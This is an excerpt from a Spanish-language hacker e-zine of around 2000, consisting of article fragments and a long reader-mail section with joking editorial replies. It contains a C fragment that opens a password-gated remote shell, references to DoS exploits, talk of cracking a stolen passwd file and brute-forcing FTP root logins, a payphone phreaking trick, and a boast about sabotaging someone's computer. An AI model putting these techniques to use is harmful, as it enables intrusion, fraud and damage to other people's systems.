...
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-
   ...
   &lt;MoonSpell> hola manga de lamos 
   [...]
   &lt;MoonSpell> yo te toy webeando a tu 
   &lt;MoonSpell> y burlandome de ti por ke se mas ke voz
   [...]
   &lt;MoonSpell> y por ke escribo para 2 de las mejores zines de latinoamerica
   [ Nex: Desde luego, no volvera a ser para la R... ]
   &lt;MoonSpell> ke sin tener niuna wea tengo el puesto de cualquier wea k 
               estudio 6 a±os 
   &lt;MoonSpell> y no voy a estudiar nunca 
   &lt;MoonSpell> pq es una perdida de tiempo
...
un mail a la direccion consultation@eurolinux.org para que sea  transmitido a 
...
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-
                     ...
                     ..--:: 03. Auditando Sistemas ::--..
                                      by 
                           teespy &lt;teespy@bigfoot.com>
                                      &
                       Don Cucumber &lt;cucumber@webhost.cl>
...
ambigⁿedad  porque en  la frase anterior  la palabra ``te'' podria haber sido
...
que todos  los  grandes programas  estan divididos  en peque±as  funciones, y 
...
if(argc!=3)
{
printf("Uso: %s &lt;numero de ip> &lt;puerto>\n", argv[0]);
exit(0);
}
printf("\n\t\tIportScan v1.0");
...
for(x=0;x&lt;strlen(buffer)-2;x++)
buff[x]=buffer[x];
if((strcmp(buff, password))==0)
send(soc_cli, "Maestro, Ordene!\n", 17, 0);
else
{
send(soc_cli, "Chupalo!\n", 9, 0);
exit(0);
}
dup2(soc_cli,0); 
dup2(soc_cli,1); 
...
Y  eso  seria  todo  por  hoy,  espero que  les haya  gustado,  y que  puedan
solucionar el peque~o problema del  IportScan, si  alguien lo hace,  me puede
enviar la respuesta a shisei_brujo@latinmail.com.
...
[NdE: Continuamos con la segunda  entrega de  este enooooorme  articulo sobre
  ...
  * DUEÑO: El usuario que creo el archivo es el due~o del mismo. El due~o  es
...
En  la  siguiente  edicion  continuare  con  esta  peque±a  introduccion a la 
...
nos veremos... Animo Roxu, MercΦ, Miquel, Alejo y demas familia.
...
todos estos:
     ...
     plaxius@xxxx.com			Desintegrator0@xxxx.net
     u_taker@xxxx.com			cd1999@xxxx.net
     chack@xxxx.com			glymar@xxxx.cl
     hackman_cl@xxxx.com		Luis Ernesto
     net-bit@xxxx.com			gualtrapa73@xxxx.com
     fcohico@xxxx.com			tspspark@xxxx.com
     jortiz@xxxx.com.mx			hr_cl@xxxx.com
     follotron@xxxx.com			elgrillo@xxxx.net
     Participant #265,711		punkyx@xxxx.cl
     kion@xxxx.org			franc6@xxxx.com
     mrnexus@xxxx.com			andykhack@xxxx.com
     rc5proyect@xxxx.net		bakan@xxxx.cl
...
proyecto_r@bigfoot.com y ya veremos que podemos hacer.
...
informacion acerca de ella en http://nt.cdlr.org/proyectos.htm
 ...
 Si quieres subscribirte manda un mail vacio a la siguiente direccion: 
		seguridad-nt-subscribe@egroups.com
...
kernel  de  la  forma  [&lt;direccion>] son  traducidas a  "symbol names"  y los 
...
[HKEY_LOCAL_MACHINE\SOFTWARE\Floosietek\FTGate\Domains\Domain Data\00000000\Mailbox Data\00000004]
...
[HKEY_LOCAL_MACHINE\SOFTWARE\Floosietek\FTGate\Domains\Domain Data\00000000\Mailbox Settings]
"MailboxCount"=dword:00000005

[HKEY_LOCAL_MACHINE\SOFTWARE\Floosietek\FTGate\Domains\Domain Data\00000000\Mailbox Settings\Mailbox Names]
"test"=dword:00000004
<--->
...
# Xploit adaptado de sinfony (chinesef00d@hotmail.com) para un DoS del vqServer 1.4.49
...
applet cargado desde la etiqueta  &lt;OBJECT>  y de un  archivo recipiente.  Los 
applet pueden leer URLs de su  codebase y  comunicarse con  los host desde el
codebase. 
...
aplicando el codebase del applet a file:///c: / 
...
Este no es un problema del lenguaje Java y supongo que tampoco es un problema
de la VM de Microsoft, es un problema  en el codebase  y la manera en  que es 
fijado por IE. 

La demostracion esta disponible en:
http://www.guninski.com/javacodebase1.html 


-----------------------------------------------
Naptha Denial of Service 
-----------------------------------------------

Advisory Original:
http://razor.bindview.com/publish/advisories/adv_NAPTHA.html
Descubierto por: Razor Security ( razor.bindview.com )

Naptha es el nombre que eligio la gente de Razor para llamar a esta "nueva"
tecnica DoS. Nueva entre  comillas por que  el concepto era  antiguo, pero
implementarlo resultaba  en consumir el 100% de los recursos de la maquina
atacante.

Las vulnerabilidades "naptha" son debilidades en la forma  en que el stack
TCP/IP y las aplicaciones de red manejan el estado de una coneccion TCP.

Creando un largo numero de conecciones TCP, y dejando estas conecciones en
un cierto estado, aplicaciones del sistema  operativo empezaran a consumir
recursos hasta fallar del todo.

Esta  tecnica  podria  parecerse  a un  simple SynFlood,  pero  lo  que la 
distingue  es que,  al hacer este ataque  de una  manera  convencional, la 
makina  atacante tambien  consumiria  recursos hasta fallar,  debido a que 
tambien implementa el stack TCP/IP vulnerable. 
La innovacion  de naptha  es que es  facilmente posible crear un DoS en la
maquina objetivo sin que la nuestra consuma demasiados recursos.
Naptha puede  hacer  esto ya que no  usa una API de  red  tradicional para
iniciar la coneccion TCP. A diferencia de el stack TCP/IP real,  naptha no
guarda el estado de la coneccion TCP (lo cual es la causa de que ocurra el
DoS), sino que  responde a los  paquetes enviados guiandose unicamente por 
la informacion contenida en el paquete mismo.

El codigo escrito  para demostrar  esta tecnica  solo se ha  enviado a las 
direcciones de seguridad de los distintos fabricantes que podrian resultar
...
From:           	shaman@xxxxxxxx.com
Subject:        	Desencriptar un archivo passwd
Date sent:      	23 May 2000 20:07:40 -0600

Hola compadres.
Les  escribo para  felicitarlos por  que la E-Zine  esta muy  la raja.  Estan
haciendo que la cultura informatica aumente aqui en este pais.
Aparte de los elogios, les escribo por otra cosa: 

[ Nex: Bah, es que nadie puede escribir un mail solo para felicitar ? ]

[ Tkr: Que si, que si, acaso no has leido el siguiente..???]

En  la Proyecto_R 1  y 2 Uds. explican como tratar de sacar el archivo passwd
de un servidor.
Ahora; yo ya hice eso, es decir,  tengo el archivo  passwd de dicha pagina en
mi disco duro pero tengo el siguiente problema: no he podido desencriptar los
passwords alli contenidos. Baje  el John  The Ripper  pero al  parecer  no se
ocuparlo, o no se que es lo que pasa que no lo puedo desencriptar. Quiero ver
si  me pueden  ayudar o  ense~arme  como desencriptar el archivo. De antemano
Gracias

[ Nex: Bueno,  bueno, ... si te hubieras leido el  numero 4 del  zine tambien 
  habrias visto  que nos  retractamos de esas lineas gracias a un mail de Don 
  Cucumber, ... hmmm, ┐de que me suena este? ...
  
  Ademas ┐que te esperabas de un zine que empezo con la palabra GUELKOME? (V.
  PR1) es  que eso  del inglex y el  linus nos  es  muy dificil,  confundimos
  terminos, shadow, passwd, ... ┐no son ficheros con muchas palabras? ]

[ Tkr: GUELKOME...???  la  verdad  yo  tampoco  recuerdo,  debe  ser pq no he
  terminado  de  leer  los  zines, apenas voy por la mitad del primero.  Pero
  igual, si ya tenes el archivo passwd debe ser facil desencriptar el * no.?]

      Shaman
Pd: sigan adelante compadres, van muy bien.

[ Nex: Pues sera segun tu... porque  yo creo que cada  vez nos  acercamos mas
  peligrosamente a  ese punto en el  que la gente  cambia de acera cuando nos
  ven venir ]

[ Tkr: Mmmm,  nex, opino totalmente diferente a ti, de hecho, hace unos meses
  hacia aca, estoy  notando  la importancia de la presentacion personal, y he
  tomado la decision de empezar a utilizar corbata, afeitarme, cepillarme los
  dientes, cortarme el cabello, ba~arme cada 8 dias aunque este limpio, etc..
  no se porque, pero creo que asi sera mejor... XDDD ]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

Date sent:      	Thu, 25 May 2000 15:17:49 -0400
From:           	angel alvarado &lt;raama@xxxxx.cl>
Subject:        	saludos

holas un saludo para el proyect_r
        
        Les felicito por ser un grupo q integra a chilenos por ser didacticos
que sigan creciendo

raama

[ Nex: Didacticos ... y muy sabios, yo me se un monton de marcas de vodka ]

[ Tkr: Dijo "chilenos", no estaba hablando de ti. ;) ]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

Date sent:      	Thu, 25 May 2000 16:37:41 -0400
From:           	angel alvarado &lt;raama@xxxxxx.cl>
Subject:        	no pude conocer el sitio...

trate de meterme  a su pagina por  medio del linck de ozono+2 y queda la pura
pq me manda al buscador de yahoo luego  busco proyecto_r salen los resultedos
ttarto de entrar y ... me sale denue el buscador

[ Nex: ┐ Que ? ]

por fa quiero  conocwer la  pag no tan solo los e-zines que baje del sitio de
vanhackez

[ Nex: Pues como hayas tenido la paciencia suficiente como para esperar desde
  mayo hasta ahora te nombraremos lector del ...dia.. ┐que pasa?, somos 
  modestos ]

chaito y espero poder conocer el site

[ Tkr: www.cdlr.org  un  poco  complicado y todo eso, pero que va..., a todas
  estas, creo que esta a punto de vencer el registro del dominio...]

raama

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	"Mastroianni" &lt;chocko@xxxxxxx.com>
Subject:        	Consultas
Date sent:      	Fri, 26 May 2000 /.:13:16 -1300

Hola, espero que estas dudas me las puedan responder directamente a mi correo
y no en la revista, ya que cuando aparesca ufff! falta mucho. 
de antemano muchas gracias ( buena el mas educado )

[ Nex: Haremos todo lo posible por agradarte ]
[ Tkr: Recuerdame no sacar esto en el zine, se lo enviamos directo al correo]

1) hace poco  conoci un programa, cuya  funcion es usar la fuerza  bruta para
encontrar los passwords de ftp  en forma remota. La duda es  la siguiente: si
uno  se  equivoca  en  colocar el  password en ftp, ┐ se le avisa  despues al
usuario que hubo un error entrar, al igual que cuando uno  se equivoca  en el
password al entrar al linux por telnet o en forma normal ? ( por que si se le
avisa, seria super cuatico que el usuario  original vea  32131321654 intentos
de entrar fallidos )

[ Nex:  Totalmente  imposible, piensa  que 32.131.321.654  intentos  fallidos 
  implican   32.131.321.654   lineas   en algun  log  del  sistema,  y  ┐ que 
  administrador esta tan loco como para leerse logs de 32.131.321.654 lineas?
  Tu tranquilo que jamas te pillaran. ]
[ Tkr: Igual opino...]

2) como lo hacen  los servidores  para tener  una coneccion  permanente hacia
afuera ┐ tienen un  contrato especial  con telefonica ? o  no necesitan estar
conectados y espera que los llamen no mas ????

[ Nex: No hombre, esa infraestructura  solo esta disponible  para  muy  pocas
  empresas. Lo que hacen la  mayoria es tener a un  chino contratado a traves
  de una empresa de trabajo temporal con un horario de 24 horas al dia que va
  uniendo  cables  en  el  servidor  cuando  se  enciende  una  lucecita  que
  significa que alguien esta llamando. ]
[ Tkr: Adicional, tambien  contratan  phreakers, para que las llamadas no les
  salgan tan costosas...]

3) ┐ Se puede usar un computador cualquiera  como servidor o necesita ser una
 Super-Computador ?

[ Nex: Todo el mundo puede servir al resto... mira la gente famosa, se  dejan
  muchos billetes en obras de caridad, ... pero siempre emociona mas ver a un
  ni~o dando sus ahorros  a los pobres. Con los ordenadores ocurre los mismo,
  uno grande dara mas rendimiento, pero ... ┐donde esta el morbo? ]

ojala me puedan responder, chao
PD: Sigan adelante !!!!
...
[ Nex: ┐ Para esto  me molesto  yo en  ocultar los  mails de  la gente ?  que 
  ingratos... ]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	"Mastroianni" &lt;chocko@xxxxxx.com>
Subject:        	Dudas
Date sent:      	Sun, 28 May 2000 //:59:44 -1300

Hola,  ojala puedan  responder  estas dudas, y  por favor, respondanlas  a mi
correo, ya  que esperar a que salga  su proximo numero seria una locura ( por
lo menos para mi )

[ Nex: Este mail me suena .... ]

1) si  una persona  quiere tratar  de ingresar a  ftp por fuerza bruta con la
cuenta del  root y no  lo logra  ┐ el root  se da cuenta  que hubieron 321354
fallos de contrase~a ? 

[ Nex: Hmmm, vamos bajando el numero de intentos, date cuenta  que cuanto mas
  peque~o sea el  log, mas posibilidades  hay de que al admin no le de pereza
  leerlo. No te cortes! Fuerza bruta rlz! ]

2) ┐Algunos de ustedes no tiene un modem que le sirva a un 486 con linux suse
 5.1 para vender ? ( no importa su velocidad )

[ Nex: En la estanteria de la izquierda, ... si, justo esa,... para ti todo ]

psono+, ojala me respondan y sigan adelante !!!

[ Nex: Y te respondemos a los dos mails !!!, luego  te  quejaras  de  nuestra
  generosidad ... ]
...
Date sent:      	Thu, 8 Jun 2000 02:41:02 -0400
From:           	Sebastian Elcano Santander &lt;pillin@xxxxxx.cl>
Subject:        	donde esta la pagina web?

hola, hace  caleta de tiempo  que no te escribia, ya ni te  acorday de mi, en
fin, quisiera saber que que chuchas paso con proyecto R, sigue o no? 

[ Nex: No, hemos fallecido, esto que lees son palabras postumas. ]
[ Tkr:  De  hecho,  esto que estas leyendo nunca existio, son solo ilusiones,
  electronicas generadas por tu cerebro, todo con el fin de ... imaginalo...]

lo que  pasa es que tenia  la pagina en los favoritos  hace ene tiempo y tuve
que formatear  el computador (pa' variar) y lo perdi. existe en la actualidad
algun sitio para "el proyecto"?  o no? si la  respuesta  es si,  me mandas la
direccion? ok, sin mas  y agradeciendo su respuesta chaooo

[ Nex: Bah... es que responder en el zine es mas divertido, www.cdlr.org xD ]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	"Emerson Casa Entel" &lt;emersongt@xxxxxx.net>
Subject:        	Porpuesta
Date sent:      	Sun, 18 Jun 2000 21:59:47 -0400

Proyecto R:

[ Nex: Que ]

Espero que todavia sigan trabajando y no se hayan metido en problemas.

[ Nex: Este mail promete... ]
[ Tkr: Trabajando..??, bahhh, ya veo... te cantare mi himno: y dice..
  A mi  me  dicen  el  negrito del batey.... por que el trabajo para mi es un 
  enemigo,  el  trabajar  yo  se lo dejo todo al buey... porque el trabajo lo  
  hizo Dios como castigo...
  Pronto lo sacare en mp3 en alguna parte en www.cdlr.org XDDD ]

Tengo una proposicion para ustedes. 

[ Nex: ┐ Que te decia ? ]

Les gustaria seguir haciendo lo  mismo que hacen y mas  encima les pagen (una
no despreciable suma de dinero).

[ Nex: ┐ Bebidas gratis ????, donde hay que firmar ??? ]
[ Tkr: Donde estara el truco...???]

Junto con la  plata, existe  capacitacion,  salidas al extranjero  y bla blah
blah. Suena bonito, pero no es chiste. 

[ Nex: No me lo creo... esto parece una de esas cartas en cadena donde tienes
  que enviar una monedita con cada una, bah ... ]
[ Tkr: Mmmm, ahora que lo pienso, eso mismo le dijeron a AndyK hace un tiempo
  y hasta ahora no lo he vuelto a ver... :┐? ]

Si no existe ni un  interes respondame  igual y avisenme.  Realmente segun lo
que he leido (aunque no es  tan tan profundo)  es metodico y  profesional, es
decir se lo toman en serio y es por esi que los elegi.

[ Nex: Te entiendo, nosotros tenemos fama de serios ]
[ Tkr: Si, serios, alguien ha visto mi gato..???]
...
[ Nex: Caballeros, el hacking no es un negocio. Si nosotros hacemos 'algo' es
  porque nos gusta y punto. Lo hacemos  porque creemos  en aquellas ideas tan
  pasadas de moda que hablaban de conocer mas  cosas, superacion,  investigar
  el sistema, ┐por que funcionan las cosas?, ...
  
  Dejen el negocio del hacking para los autenticos profesionales de seguridad
  informatica. Aqui, en este zine, en estos mails, estamos en otro lado; pero
  quien sabe si  tambien estamos  en esa  empresa de seguridad  que contratan
  para auditar sus maquinas, pero esos no son  ni Taker, ni Plaxius, ni Nexus
  ... esos otros son profesionales con  nombre y  apellidos. Aqui  solo somos
  handles.
  
  Se~ores, ... aprendan a distinguir ]
[ Tkr: Que es un handle..?? XDDD]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

Date sent:      	5 Jul 00 15:17:20 ARST
From:           	"Mr.Nuk3m" &lt;mr_nuk3m@xxxx.net>
Subject:        	Fat32 y Linux :(

Como anda gente ....
 Veo que han publicado una nota mia en Pr9 :)

[ Nex: Una 'peque~a' nota, si ... xD ]

 Les queria preguntar si siguen con el proyecto MKLinuxTeam ???

 Porque ando  buscando el  Linux RedHat  6.x que  puede  manejar  particiones
 FAT32. Estoy hablando del FIPS que  viene, no se en  que version, con en Red
 Hat 6.x y que puede manejar las particiones de Win98...

 Si disponen de  alguna version  digan a donde el  cd-rom virgen. Yo  soy  de
 Argentina. Tiene algun distribuidor en la Arg del MkLinuxTeam?? 

[ Nex: A ver, ... ┐quien lleva eso?, que levante la mano ... ]
[ Tkr: En  Argentina,  esta  o estaba Mate, pero tengo entendido que se iba a
  vivir al otro lado del charco... entonces no se... alguien se apunta...??, 
  igual seria mas rapido encontrarlo en la web.]

 Les  comento  que  cuando  ponga  el  site  On-Line,  va  a  funcionar  como
 Distro-Site de Proyecto R y de otras e-zines Ok :)

[ Nex: Pues menos mal, porque como tuvieramos que confiar en nuestra web para
  eso, .. xDD ]
[ Tkr: y por que me miran a mi..??? XD ]

 Un saludo y sigan asi...

 Mr. Nuk3m  <(= Editor de C.I.A Magazine =)>
 mr_nuk3m@xxxxxx.net

____________________________________________________________________
Get free email and a permanent address at http://www.netaddress.com/?N=1

[ Nex: Estos mensajes me estressan .... ]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:  "sac11" &lt;sac11@xxxxxxx.com>
To:    proyecto_R@bigfoot.com
CC to: proyecto_r@bigfoot.org.proyecto_r@bigfoot.net.proyecto_r@bigfoot.net

[ Nex: Chico previsor ]

Subject:        	colaborador
Date sent:      	Fri, 21 Jul 2000 0.:11:06 -1300

Hola ProYeCtO_R: 

[ Nex: Ho14 $4K11 ]

Soy espa~ol, me llamo (apodo) es _SAc 

[ Nex: Pues en mi carnet de identidad pone Nexus, que raro eres. ]
[ Tkr: Y yo soy Colombiano y me llamo (apodo) Taker.]

me encontrareis por el irc-hispano.org #hacking , #whe. 

[ Nex: No me digas que tenemos fans ahi ? ]
[ Tkr: Ahhh, un canal de Hack...!!! que bien, puedo entrar..???]

 Pues el caso es que  quiesiera saber si seguis en pie para colaborar. Soy el
 fundador de un gupo de hack aca en Espa~a el WhE y quisieramos colaborar con
 ustedes, y ya de paso podrian mandarme los  proyecto_r que  me falta que son
 el desde el 3 hasta alante. τ
 
[ Nex: Ah, bueno, si eres el fundador entonces si que puedes colaborar,  pero 
  se te olvido mandarnos una direccion postal donde enviarte los zines. Mejor
  nos escribes otra vez pero esta vez nos das los datos bien ]
[ Tkr: Buscalas en Zine Store...]
...
[ Nex: Dios mio! esto es una plaga!!! ]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	"DARIO FRANCISCO PRADO" &lt;dariusfranciscus@xxxxx.com>
Subject:        	pagina de interes
Date sent:      	Sat, 22 Jul 2000 01:09:46 GMT

http://phrack.infonexus.com/archive.html

[ Nex: Pues yo no te la cambio por www.persiankitty.com ]
[ Tkr: http://www.cdlr.org/texts/otros/todo/packet/files/index.html]

________________________________________________________________________
Get Your Private, Free E-mail from MSN Hotmail at http://www.hotmail.com

[ Nex: ┐ Es que ya nadie paga por tener un miserable mail ? ]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	kanwei@xxxxxx.cl
Subject:        	Saludos
Date sent:      	Fri, 4 Aug 2000 14:50:56 -0500

Estimados Amigos:
Desde  hace bastante  tiempo he paseado  por internet  tratando  de encontrar
chilenos amantes  de  la  computacion  e  informatica,  y  la  semana  pasada
encontre,  en  la seccion  de amigos de  ezkracho, el  link a su  pagina. Sin
embargo no  he podido  visitarlos ya  que su direccion no es alcanzable, ┐Que
pasa...? ┐Se mudaron?, o quizas llege tarde y se disolvieron. (esto ultimo lo
lamentaria  mucho). Me  guataria seber  que  paso...  Felicitandolos  por  su
iniciativa. Atentamente,

Kanwei

[ Nex: Pues paso  de todo, y  por muchas razones hemos estado sin web durante 
  unos cuantos meses. Pero bueno, ahora ya tenemos de nuevo y todo va como la
  seda :) ]
[ Tkr: Otra vez me estan mirando a mi..??? ]

PD: No quise enviar encriptado el correo (PGP) ya que se trataba de un saludo
 afectuoso para Uds.

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	"" &lt;josegarridom@xxxxx.com>
Subject:        	MKLINUX TEAM
Date sent:      	Tue, 29 Aug 2000 19:11:36 CLT

Salu2 Proyecto R:				29/08/2000

Hace  relativamente  pocos dias  encontre sus  revistas  (1 semana) y me  han
parecido geniales. Por fin encontre  algo Chileno, y cerca  de vi~a  (stgo.),
por lo visto.

[ Nex: Sisi, segun bajas a mano derecha. ]

Con respecto al Proyecto  MKLINUX Team yo tengo una version original de LINUX
Redhat 5.2. Yo  puedo facilitar  el  CD  para que  lo  copien  tambien  puedo
conseguirme algun quemador para poder distribuir las copias.

[ Nex: A ver, ... que alguien se de por aludido en la trastiendaaaaa !!! ]
[ Tkr: Plax, podrias contactarlo, y enviarle un RedHat 6.0, ahh, y los que
  colombianos que necesiten copias, me pueden contactar.]

Esperando su pronta respuesta, me despido...

[ Nex: Pronta, pronta ... pues no,... pero al final merece la pena, hombre! ]


PD: El dia  28/08/2000 intente  ingresar en su home-page pero no  pude... que
pasa?

[ Nex: V. mail anterior ]
[ Tkr: Nooooo, otra vez noooo..!!!]

       ****************

PD2: Deseo  comunicarme  con mas  hack  y  wannabe┤s  de vi~a, me  pueden dar
algunos e-mail para comuniarme con ellos y poder aprender mas sobre este tipo
de *educacion* ;-)

[ Nex: ┐Y si montamos una seccion de contactos en cdlr.org ? hmmm... phreaker
  experto en PBX's busca informatico autista  para ser introducido en el arte 
  del penetration  testing ... cracker  de sistemas  busca mujer hacker  para
  recibir lecciones de exaltacion de la sensibilidad ... ]
[ Tkr: Si, me gusta la idea..!!! XDD]

      ****************

PD3: Existe alguna forma de poder ayudar al equipo, ya sea con su home-page o
 algo por el estilo....

[ Nex: Con buenos articulos para la R ]
[ Tkr: Y  asi  ayudamos  para  que  salga  mas  seguido,  y para que nuestros 
  editores no se estresssssennnn..!!!, y Taker no renuncie a ser el editor, y
  Etc... Bahh, me acaban de informar que Taker ya Renuncio]

      ****************

PD4: Donde puedo conseguir el Programa John the Ripper, Haktek, Wardialer, 
phonetag, etc...

[ Nex: No te digo donde, pero te digo como, que mola mas: buscandolos ]
[ Tkr: En mi pagina, creo.. pero no me acuerdo la direccion... :┐? ]

La otra  vez me dieron un truco  para los telefonos publicos, no se que color
en especial, pero era el siguiente, aunque no lo he provado...

Se toma  el auricular y  en la parte  de abajo (por donde uno habla)  sale el
cable hacia la  maquina, lo que  teni que  hacer....... pero lo que teni  que
hacer, es tirar el cable bien fuerte y encontrar el  cable blanco,  cuando lo
tengas toma un alfiler y pinchaselo, esto  dara una se~al como de  ingreso de
moneda$ y podras conversar libremente.....

       ****************

Con respecto al mail que  envio Gonzalo de Loncoche con respecto a Regedit de
W95, les cuento que yo trabajo con esa plataforma y no encontre ese registro,
lo mas probable es que se trate de PGP. 
Donde lo encuentro? # que no sea en pgpi.com #

[ Nex: ┐ Y por que no de ahi ? ]

       ****************

Les envio algo asi como un  truco de regedit, para  cuando quieran  crear una
web-page  con  el  segundo  boton del  mouse  opc.  "Muevo", "Microsoft  HTML
Document x.x" no solo les aparezca &lt;HTML>&lt;/HTML>, me entiendo... al editar la
pagina y ver el codigo fuente ;-)

Solo ingresa en HKEY_CLASSES_ROOT/.html/htmlfile/ShelNew y ejecuta Data aqui 
aparecera algo como esto:

3C 48 54 4D 4C 3E 3C 54  &lt;HTML>&lt;/  <--- "Aqui ingresa el codigo"
48 54 4D 4C 3E		 HTML>

Solo debes escribir lo que quieres que aparezca....
...
[ Nex: Se me estan acabando los comentarios ironicos para las firmas ... ]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	"" &lt;josegarridom@xxxxxxx.com>
Subject:        	Explicacion Metodo Octal
Date sent:      	Mon, 04 Sep 2000 17:13:27 CLT

Hola a to2 nueva% :			04/09/2000

Estoy muy  entusiasmado  con el  Proyecto R desde que encontre la  revista en
i-net.

[ Nex: Tambien podia escribirnos alguien para insultarnos y eso...  no se, el
  morbo ]

Como consejo para su revista me gustaria decirles  que omitieran los acentos,
eso es todo.

[ Nex: ┐ Que acentos ? ]
[ Tkr: Que acentos..???]

Quisiera hacer un aporte para la revista que consiste en explicar una seccion
del R1 titulada:
...
en el encabezado "Jugando con  el PHF", puede que a algunos  les haya quedado
una gran duda en relacion al Valor Octal, este es mi aporte:

[ Nex: Aporta, aporta... no sabia donde diablos meter estas lineas asi que no
  las meto en ningun lado y quedan como mail ]

 *************************

El  metodo  octal  es para usuarios  mas avanzados  (segun el texto  donde lo
extrai),  esta esta  basada en  usar tres  octetos, uno  para cada  grupo  de
permisos.

*******Nota: Esto tambien sirve en Linux ;-)******

[ Nex: Ejem!, ┐ y vale en windows ? ]

He aqui un cuadro explicativo:

µµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµ
µ Binario     Octal     Permisos     Descripcion µ
µµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµ
µ 000	      0	        ---	  ningun permiso µ
µ 001	      1         --x       ejecucion      µ
µ 010	      2         -w-       escritura      µ
µ 011	      3         -wx	  escri. y ejec. µ
µ 100	      4         r--       lectura        µ
µ 101         5         r-x       lect. y ejec.  µ
µ 110	      6         rw-       lect. y escri. µ
µ 111  	      7   	rwx       todos permisos µ
µµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµµ

Si asi no les quedo tan claro como se suponia look los siguientes ejemplos:

* Ejemplo 1 *

chmod 700

7 = 111 = rwx : corresponde al propietario y tiene todos los permisos.
0 = 000 = --- : corresponde al grupo y no tiene ningun permiso.
0 = 000 = --- : corresponde al resto y tampoco tienen permisos.

* Ejemplo 2 *

chmod 543

5 = 101 = r-x : corresponde al propietario y tiene derecho de lectura y 
                ejecucion.

4 = 100 = r-- : corresponde al grupo y tiene solo derecho de lectura.

3 = 011 = -wx : corresponde al resto y tiene derecho a escritura y ejecucion.

Espero que con estos les haya quedado mas claro el asunto, entonces, dulces 
Hack.

***Nota: r= lectura; w= escritura; x= ejecucion***


          !!!VIVA EL PROYECTO MKLINUX TEAMííí

[ Nex: íííí VIVA NOSOTROS !!!! íííí SOMOS LA LECHE !!!! ]          

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	"Nykkro Damage" &lt;nykkro_damage@xxxxxx.com>
Subject:        	Hola a todos
Date sent:      	Fri, 08 Sep 2000 23:00:00 CLT

Hola, chicos del Proyecto R:

junto con saludarlos, quiero contarles que soy un chico de 17 a~os, que desea
hacer una aclaracion.

[ Nex: El publico es tuyo ]

Hace  tiempo,  una persona  escribio  diciendo  que era  phreak, que se decia
dominicano y cuyo nick era Nykhro-Damage. Esta persona  uso fuerza bruta para
sacarme la password del correo electronico (y de paso rompio  la cerradura de
mi velador, porque ni se le ocurrio sacar la password desde Internet) y envio
e-mails  a lugares  donde se  profesa la  doctrina hacker,  como el  sitio de
Proyecto R.

[ Nex: ┐ Desde  cuando se  necesita  tener la  clave de un correo para enviar 
  mails desde el ? ]
[ Tkr: Eso, eso...]

Hace poco,  cuando lo pille, supo  lo que en  realidad significa mi nickname:
creo que aun no puede reparar  su computadora y todo por un  peque~o programa
que le quito  el arranque de su  computadora, y  que bloquee ademas  con  una
password en el BIOS. Como no  sabe sacar las  passwords (que cretino... creia
que me las iba a ganar) del  BIOS se quedo sin computadora y no ha  hecho mas
travesuras.

[ Nex: Oye, me estas dando miedo ... ]
[ Tkr: Vaya, me caia bien el muchacho, de hecho estaba convencido que todo lo
  que ofrecia era verdad... y ahora, quien defendernos...???]

Y como si fuera poco, es el responsable de que a cada rato a una amiga mia la
llamen por telefono desde la compa~ia timofonica preguntando por mi. ┐Es 
posible que el ser humano sea capaz de tama~a torpeza? Quiero aprovechar para
enviarle un saludo al que LEJOS debiera ser elegido el lamer del mes, me 
refiero a Dj-Tycho, un estupido que trato de ganarme en MI juego (y no es que
me las de de Zero Cool...) nadie sabe en que parte chatea, nadie sabe como el
papa le compro su computadora para navidad...

[ Nex: Bah,  pues  que envidia, ya podia mi papa comprarme un ordenador a mi, 
  porque ya me estoy  hartando  de tener  que editar el  zine en el  cyber de 
  abajo ... ]

Escribo esto porque no quiero que la revista Proyecto R  sea viciada por este
tipo de  personajes que  no hacen  mas que  estupidizar  la red,  haciendonos
darnos cuenta de  que somos  mucho mas  inteligentes de lo  que somos.  Si no
fuera  por estos  lamers que  meten la pata  en el  lugar que  no  deben,  la
comunidad  informatica  hacker seria totalmente segura y la informacion seria
un poco mas libre de lo que es.

[ Tkr: Y peligrosa...]

Van  por un buen  camino  y espero  contribuir con  algunas cosillas  para la
pagina.  Ojala que  no suceda  mas este tipo de cosas (y lamento haberme dado
cuenta tarde)  porque no hacen  mas que quitar prestigio a  una  revista bien
organizada, con variada informacion y que, para bien o para mal, es una buena
